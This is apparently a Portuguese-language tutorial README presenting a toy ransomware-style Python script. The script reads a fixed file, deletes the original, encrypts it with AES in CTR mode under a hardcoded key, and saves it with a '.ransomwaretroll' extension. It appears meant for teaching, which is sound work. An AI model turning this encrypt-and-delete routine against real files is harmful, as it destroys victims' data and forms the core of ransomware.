- ## Criptografia de Arquivo usando AES em modo CTR

Breve Explicação - Os dois codigos seguem mesma base:

- Importação das bibliotecas os e pyaes.
- Definição do nome do arquivo a ser criptografado e leitura dos dados do arquivo.
- Remoção do arquivo original.
- Definição da chave de criptografia.
- Criptografia dos dados do arquivo usando o algoritmo AES em modo CTR.
- Salvando o arquivo criptografado com a extensão ".ransomwaretroll".

Neste exemplo, o programa realiza a criptografia de um arquivo usando o algoritmo de criptografia simétrica AES (Advanced Encryption Standard) em modo de operação CTR (Counter Mode). 
E adiciona uma extensão ".ransomwaretroll" ao nome do arquivo criptografado.

```python
import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

